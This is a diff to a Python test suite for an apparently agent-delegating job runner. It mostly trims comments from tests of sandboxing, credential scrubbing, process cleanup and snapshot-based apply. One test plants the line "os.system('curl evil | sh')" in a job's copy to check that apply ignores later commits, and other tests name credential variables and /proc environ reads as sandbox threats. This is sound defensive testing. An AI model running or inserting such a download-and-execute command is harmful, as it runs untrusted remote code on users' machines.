@@ -1,5 +1,3 @@
-"""Jobs: create, run, snapshot, detect a dead worker, cancel."""
-
 import json
 import os
 import subprocess
@@ -175,9 +173,6 @@ def test_all_lists_newest_first(store, repo):
     assert [j.id for j in store.all()] == [second.id, first.id]
 
 
-# --- Real detached launches. A fake `agy` on PATH stands in for the CLI. ---
-
-
 def test_launch_runs_detached_and_leaves_no_zombie(store, repo, fake_agy, wait_for):
     fake_agy("echo from agy > from_agy.txt; echo done")
     job = _job(store, repo, "x")
@@ -185,7 +180,7 @@ def test_launch_runs_detached_and_leaves_no_zombie(store, repo, fake_agy, wait_f
     job = wait_for(store, job.id, {"succeeded", "failed", "died"})
     assert job.state == "succeeded", store.output_path(job.id).read_text()
     assert job.files_changed == ["from_agy.txt"]
-    # The worker was reparented away from us, so it is not our child to reap.
+    # the worker was reparented away from us, so it is not our child to reap
     with pytest.raises(ChildProcessError):
         os.waitpid(job.pid, os.WNOHANG)
 
@@ -198,8 +193,7 @@ def _group_gone(pgid, timeout=5):
         except ProcessLookupError:
             return True
         except PermissionError:
-            # macOS answers EPERM for ~0.1s while a killed group is still
-            # being reaped, then ESRCH. Keep polling.
+            # macOS answers EPERM for ~0.1s while a killed group is still being reaped, then ESRCH
             pass
         time.sleep(0.1)
     return False
@@ -302,9 +296,6 @@ def test_apply_on_a_clean_file_stages_it(store, repo):
     assert not applied.applied_unstaged
 
 
-# --- The check command, run in the job's copy after the executor succeeds. ---
-
-
 def _gone(pid, timeout=5):
     deadline = time.monotonic() + timeout
     while time.monotonic() < deadline:
@@ -318,12 +309,8 @@ def _gone(pid, timeout=5):
     return False
 
 
-def _sleeper():
-    """A `sleep` command line no other process has, and a test for its death.
-
-    The check runs in its own PID namespace on Linux, so a pid it reports
-    means nothing out here; the process is found by its command line instead.
-    """
+def _sleeper_found_by_command_line():
+    # Linux: the check runs in its own PID namespace, so a pid it reports means nothing out here
     marker = f"sleep 30.{time.time_ns() % 10**9}"
 
     def gone(timeout=5):
@@ -387,7 +374,7 @@ def test_no_check_in_review_mode(store, repo):
 
 def test_a_check_timeout_fails_the_check_and_kills_its_group(store, repo):
     # The sandbox lets the check write only in its copy and its own $TMPDIR.
-    sleep, gone = _sleeper()
+    sleep, gone = _sleeper_found_by_command_line()
     job = _job(store, repo, "true", check=f'{sleep} & echo $! > "$TMPDIR/bg.pid"; wait',
                check_timeout_seconds=1)
     pidfile = store.path(job.id) / "tmp" / "bg.pid"
@@ -403,7 +390,6 @@ def test_a_check_timeout_fails_the_check_and_kills_its_group(store, repo):
 
 
 def test_finished_process_groups_are_forgotten(store, repo):
-    # cancel signals every recorded group; a finished one's id may be reused by the OS.
     job = _job(store, repo, "true", check="")
     job.check_command = f'cp "{store.path(job.id) / "job.json"}" "$TMPDIR/seen.json"'
     store.save(job)
@@ -415,7 +401,7 @@ def test_finished_process_groups_are_forgotten(store, repo):
 
 def test_cancel_during_the_check_kills_it(store, repo, fake_agy, wait_for):
     fake_agy("true")
-    sleep, gone = _sleeper()
+    sleep, gone = _sleeper_found_by_command_line()
     job = _job(store, repo, "x",
                check=f'{sleep} & echo $! > "$TMPDIR/bg.pid"; wait')
     pidfile = store.path(job.id) / "tmp" / "bg.pid"
@@ -439,9 +425,6 @@ def test_a_job_json_from_before_the_check_fields_still_loads(store, repo):
     f.write_text(json.dumps(data))
     loaded = store.load(job.id)
     assert loaded.check_command is None and loaded.outcome is None
-
-
-# --- revise: a second attempt in the same copy, on top of the first. ---
 
 
 TWO_STEP = "if [ -f a.txt ]; then echo two > b.txt; echo second; else echo one > a.txt; echo first; fi"
@@ -502,7 +485,6 @@ def test_revise_resets_the_result_and_the_old_process_ids(store, repo):
     assert store.load(job.id).state == "failed"
     job = revise(store, job.id, "exit cleanly", timeout_seconds=120)
     assert (job.state, job.exit_code, job.error, job.finished_at) == ("queued", None, None, None)
-    # A stale process group id would let cancel signal whatever reused it.
     assert job.pid is None and job.pgid is None
     assert job.timeout_seconds == 120
     assert store.load(job.id) == job
@@ -585,9 +567,6 @@ def test_active_count_spans_projects_and_ignores_dead_workers(store, repo):
     store.save(b)
     assert active_count(store) == 2
     assert store.load(a.id).state == "queued"
-
-
-# --- Partial apply ---
 
 
 def _two_file_job(store, repo):
@@ -684,9 +663,6 @@ def test_a_rename_is_applied_whole_from_either_side(store, repo, side):
     assert apply(store, job.id)[0] == ["new.txt"]
 
 
-# --- Garbage collection ---
-
-
 def _finished(store, repo, state="succeeded", age_seconds=0.0, finished=True):
     job = _job(store, repo, "true")
     job.state = state
@@ -742,9 +718,6 @@ def test_gc_with_no_jobs(store):
     assert gc(store, older_than_seconds=0) == []
 
 
-# --- How revise, the check, partial apply, and gc work together. ---
-
-
 def test_revise_runs_the_check_again_on_the_new_attempt(store, repo):
     from polyphony.jobs import revise
     job = _job(store, repo, TWO_STEP, check="test -f b.txt && echo has b")
@@ -771,7 +744,7 @@ def test_a_failed_revision_does_not_keep_the_old_check_result(store, repo):
     run(store.path(job.id))
     assert store.load(job.id).check_passed is True
     revise(store, job.id, "try again")
-    run(store.path(job.id))  # fails this time, so no check runs
+    run(store.path(job.id))
     job = store.load(job.id)
     assert job.state == "failed"
     assert job.check_passed is None and not store.check_path(job.id).exists()
@@ -827,11 +800,7 @@ def test_gc_records_a_discard_for_a_job_with_no_outcome(store, repo):
     assert entries[left.id]["outcome"] == "discarded" and entries[left.id]["via"] == "gc"
 
 
-# --- Merge blockers: the check's sandbox, its leftovers, quoted paths, gc races. ---
-
-
 def test_the_check_cannot_write_outside_its_copy(store, repo):
-    # The agent only writes a script in its copy; the check runs it.
     agent = (
         "cat > run_tests.sh <<'SH'\n"
         "echo check ran\n"
@@ -844,7 +813,6 @@ def test_the_check_cannot_write_outside_its_copy(store, repo):
     run(store.path(job.id))
     job = store.load(job.id)
     assert job.check_passed is False
-    # It ran and was refused, rather than never running (no sandbox) and passing vacuously.
     out = store.check_path(job.id).read_text()
     assert "check ran" in out and _denied(out), out
     assert not (Path(repo) / "written_by_check.txt").exists()
@@ -852,7 +820,7 @@ def test_the_check_cannot_write_outside_its_copy(store, repo):
 
 
 def _denied(check_output):
-    """Whether a write was refused by the sandbox: bwrap mounts read-only, Seatbelt denies."""
+    # bwrap mounts read-only, Seatbelt denies the write
     return "Read-only file system" in check_output or "Operation not permitted" in check_output
 
 
@@ -936,7 +904,7 @@ def test_resetting_after_the_check_keeps_linked_paths(store, repo):
     assert job.check_passed is True
     assert (copy / "env").is_symlink() and (copy / "env" / "marker").exists()
     assert not (copy / "junk.txt").exists()
-    assert not (Path(repo) / "env" / "from_check").exists()  # the link target is read-only
+    assert not (Path(repo) / "env" / "from_check").exists()
     assert job.files_changed == ["new.txt"]
 
 
@@ -967,7 +935,6 @@ def test_gc_leaves_a_job_revised_while_it_runs(store, repo, monkeypatch):
     seen = {}
 
     def slow_disk_usage(path):
-        # gc walks the newer job first; meanwhile a client revises the older one.
         if Path(path).name == newer.id and not seen:
             seen["revised"] = jobs.revise(store, older.id, "fix it").state
         return real(path)
@@ -1002,9 +969,6 @@ def test_gc_takes_the_store_lock_before_deleting(store, repo, monkeypatch):
     jobs.gc(store, 0)
     assert held == [True]
 
-
-# The executor can write anything in its copy. Polyphony's own git commands
-# there must never run code the executor planted or reach another repository.
 
 def _objects(repo):
     return _git("count-objects", "-v", cwd=repo), _git("rev-list", "--all", cwd=repo)
@@ -1080,14 +1044,12 @@ def test_a_commondir_file_cannot_share_another_repos_git_dir(store, repo):
     assert _objects(repo) == before
 
 
-# Worker races and stuck slots.
-
 def test_a_stale_worker_does_not_run_a_revised_job(store, repo):
     job = _job(store, repo, "echo run >> runs.txt; exit 0")  # exit: the rest of a revised prompt is prose
     job.state = "cancelled"
     store.save(job)
     revise(store, job.id, "again")
-    run(store.path(job.id), attempt=1)  # the cancelled attempt's worker, late
+    run(store.path(job.id), attempt=1)
     assert store.load(job.id).state == "queued"
     run(store.path(job.id), attempt=2)
     job = store.load(job.id)
@@ -1121,9 +1083,6 @@ def test_refresh_under_the_store_lock_does_not_deadlock(store, repo):
     worker.start()
     worker.join(timeout=10)
     assert done == [0]
-
-
-# --- Secrets: withheld files, and environment variables kept from the agent and the check. ---
 
 
 def test_a_job_records_the_secrets_its_copy_withheld(store, repo):
@@ -1169,7 +1128,7 @@ def test_the_check_loses_credential_variables_but_keeps_path(store, repo, monkey
     monkeypatch.setenv("FOO_API_KEY", "k")
     monkeypatch.setenv("GH_TOKEN", "t")
     monkeypatch.setenv("DB_PASSWORD", "p")
-    monkeypatch.setenv("foo_api_key", "lower")  # names are matched case-sensitively
+    monkeypatch.setenv("foo_api_key", "lower")
     monkeypatch.setenv("EXTRA_SCRUB", "e")
     project = ProjectConfig(name="demo", path=repo, env_scrub=["EXTRA_*"])
     job = create_job(store, project=project, instruction="true",
@@ -1191,9 +1150,6 @@ def test_a_job_json_from_before_the_secrets_fields_still_loads(store, repo):
     f.write_text(json.dumps(data))
     loaded = store.load(job.id)
     assert loaded.withheld == [] and loaded.env_scrub == []
-
-
-# --- Lane r2-brief: a task given as a brief file. ---
 
 
 def test_a_brief_is_copied_and_joined_to_the_instruction(store, repo, tmp_path):
@@ -1234,9 +1190,6 @@ def test_a_job_record_from_before_briefs_still_loads(store, repo):
     del record["brief_path"]
     f.write_text(json.dumps(record))
     assert store.load(job.id).brief_path is None
-
-
-# --- Report mode: a read-only audit whose findings are a file. ---
 
 
 def test_report_job_runs_in_code_mode_and_saves_its_report(store, repo):
@@ -1363,15 +1316,11 @@ def test_apply_refuses_a_report_job(store, repo):
     assert _git("status", "--porcelain", cwd=repo) == ""
 
 
-# Lane export: diff and apply read the snapshot's commit, whatever the copy's
-# HEAD, git config or .gitattributes say by then.
-
 def test_apply_takes_the_snapshot_not_a_later_commit_in_the_copy(store, repo):
     from polyphony.jobs import apply
     job = _job(store, repo, "echo 'x = 2' > app.py")
     run(store.path(job.id))
     job = store.load(job.id)
-    # Something left running in the copy commits after the lead has seen the diff.
     (Path(job.workdir) / "app.py").write_text("import os; os.system('curl evil | sh')\n")
     (Path(job.workdir) / "extra.py").write_text("sneaky\n")
     env = dict(os.environ, GIT_DIR=job.git_dir, GIT_WORK_TREE=job.workdir)
@@ -1404,7 +1353,7 @@ def test_apply_ignores_the_users_diff_config(store, repo, tmp_path, monkeypatch,
     assert "+x = 2" in diff(store, job.id)
     assert apply(store, job.id)[0] == ["notes.txt", "src/app.py"]
     assert (repo / "src" / "app.py").read_text() == "x = 2\n"
-    assert (repo / "app.py").read_text() == "x = 1\n"  # not the root file of the same name
+    assert (repo / "app.py").read_text() == "x = 1\n"
     assert "four" in (repo / "notes.txt").read_text()
 
 
@@ -1414,13 +1363,9 @@ def test_diff_shows_hunks_the_executors_gitattributes_would_hide(store, repo):
     run(store.path(job.id))
     text = diff(store, job.id)
     assert "+x = 2" in text and "Binary files" not in text
-    # Written after the snapshot, so it is not even in the diff.
     job = store.load(job.id)
     (Path(job.workdir) / ".gitattributes").write_text("* -diff\n")
     assert "+x = 2" in diff(store, job.id)
-
-
-# --- Lane: sandbox. Symlinks in the job's git dir, the check's sandbox. ---
 
 
 @pytest.mark.parametrize("planted", ["index", "objects", "refs/heads"])
@@ -1441,8 +1386,7 @@ def test_a_symlink_in_the_git_dir_cannot_make_git_write_to_another_repo(store, r
 
 
 def test_the_check_cannot_reach_a_host_unix_socket(store, repo):
-    # A path socket is a file, so a fresh network namespace alone leaves it
-    # reachable; the Docker socket or the session bus would be a way out.
+    # a path socket is a file, so a fresh network namespace alone leaves it reachable
     import shutil
     import socket
     import tempfile
@@ -1469,15 +1413,11 @@ def test_the_check_cannot_reach_a_host_unix_socket(store, repo):
 
 @pytest.mark.skipif(not sys.platform.startswith("linux"), reason="bwrap's PID namespace")
 def test_the_check_cannot_see_host_processes(store, repo):
-    # Same uid, so without its own PID namespace the check could read the
-    # server's /proc/<pid>/environ, credentials and all, or signal it.
+    # Linux: same uid, so without its own PID namespace the check could read /proc/<pid>/environ
     job = _job(store, repo, "true", check=f"echo check ran; test ! -e /proc/{os.getpid()}")
     run(store.path(job.id))
     assert "check ran" in store.check_path(job.id).read_text()
     assert store.load(job.id).check_passed is True
-
-
-# --- Lane lifecycle: cancel against the worker, leftover process groups, the claim grace. ---
 
 
 def test_a_worker_that_claims_while_cancel_runs_does_not_outlive_it(store, repo):
@@ -1487,8 +1427,6 @@ def test_a_worker_that_claims_while_cancel_runs_does_not_outlive_it(store, repo)
     real_load = store.load
 
     def load(job_id):
-        # The race was a claim between cancel's two reads of the job; cancel
-        # now reads it once, under the lock the claim needs.
         if load.calls and worker.ident is None:
             worker.start()
             deadline = time.monotonic() + 2
@@ -1504,15 +1442,13 @@ def test_a_worker_that_claims_while_cancel_runs_does_not_outlive_it(store, repo)
     finally:
         store.load = real_load
     if worker.ident is None:
-        worker.start()  # late, as a worker launched just before the cancel would be
+        worker.start()
     worker.join(timeout=20)
     assert not store.path(job.id).exists()
     assert not (repo / "out.txt").exists()
 
 
 def test_the_worker_never_overwrites_a_cancel_that_landed_while_it_ran(store, repo):
-    # The executor stands in for a cancel whose signal the worker survived:
-    # it marks the job cancelled on disk, as cancel does under the lock.
     job = _job(store, repo, "")
     record = store.path(job.id) / "job.json"
     job.instruction = (
@@ -1535,12 +1471,11 @@ def test_what_the_executor_leaves_in_the_background_dies_with_it(store, repo, tm
 
 
 def test_the_claim_grace_counts_from_launch_not_from_create(store, repo, fake_agy, wait_for):
-    # delegate_many makes every copy before it launches any, under the store lock.
     fake_agy("true")
     job = _job(store, repo, "x")
-    job.queued_at = time.time() - QUEUE_GRACE_SECONDS - 1  # slow later copies
+    job.queued_at = time.time() - QUEUE_GRACE_SECONDS - 1
     store.save(job)
-    with store.lock():  # the worker can't claim until delegate_many lets go
+    with store.lock():
         launch(store, job)
         assert store.refresh(store.load(job.id)).state == "queued"
     assert wait_for(store, job.id, {"succeeded", "failed", "died"}).state == "succeeded"
@@ -1555,7 +1490,7 @@ def test_refresh_of_a_dead_worker_kills_the_executor_it_left(store, repo, fake_a
     while not (job := store.load(job.id)).executor_pgid:
         assert time.monotonic() < deadline, "executor never started"
         time.sleep(0.05)
-    os.kill(job.pid, signal.SIGKILL)  # the OOM killer, say
+    os.kill(job.pid, signal.SIGKILL)
     died = wait_for(store, job.id, {"died"})
     assert died.executor_pgid is None and died.check_pgid is None
     assert _group_gone(job.executor_pgid), "executor outlived its dead worker"
@@ -1587,9 +1522,6 @@ def test_what_the_check_daemonizes_dies_with_it(store, repo):
     assert not (Path(job.workdir) / "late.txt").exists()
 
 
-# --- Lane reportapi: only a report this attempt wrote, bounded, is the job's. ---
-
-
 def test_an_ignored_old_report_is_left_out_of_a_report_jobs_copy(store, repo):
     (repo / ".gitignore").write_text("env/\ndata/\nREPORT.md\n")
     _git("commit", "-q", "-am", "ignore reports", cwd=repo)
@@ -1600,7 +1532,6 @@ def test_an_ignored_old_report_is_left_out_of_a_report_jobs_copy(store, repo):
     job = store.load(job.id)
     assert job.state == "failed" and job.report_path is None
     assert (repo / "REPORT.md").read_text() == "OLD REPORT FROM LAST MONTH\n"
-    # A code job still gets the ignored file, as any other.
     assert (Path(_job(store, repo, "true").workdir) / "REPORT.md").exists()
 
 
@@ -1643,7 +1574,6 @@ def test_an_oversized_report_is_cut_at_the_limit(store, repo, monkeypatch):
     assert job.state == "succeeded", job.error
     assert job.report_truncated and job.report_chars == 10
     assert store.report_path(job.id).read_bytes() == b"abcdefghij"
-    # A larger report.md saved before the cap is still read only up to it.
     store.report_path(job.id).write_text("x" * 100)
     assert read_report(store, job.id) == "x" * 10
     assert report(store, job.id)["total_chars"] == 10
@@ -1660,18 +1590,13 @@ def test_a_task_with_a_nul_byte_is_refused(store, repo):
     assert store.load(job.id).attempt == 1
 
 
-# Lane: workspace review fixes.
-
 def test_the_job_home_is_expanded_and_absolute(tmp_path, monkeypatch):
-    """POLYPHONY_HOME=~/.polyphony from an MCP config's env block arrives unexpanded."""
+    # POLYPHONY_HOME=~/.polyphony from an MCP config's env block arrives unexpanded
     from polyphony.jobs import JobStore
     monkeypatch.setenv("HOME", str(tmp_path))
     assert JobStore(Path("~/.polyphony")).root == tmp_path / ".polyphony"
     monkeypatch.chdir(tmp_path)
     assert JobStore(Path("rel")).root == tmp_path / "rel"
-
-
-# --- The agy loop as the worker sees it. ---
 
 
 def test_a_stalled_report_job_fails_but_keeps_its_report(store, repo, monkeypatch):
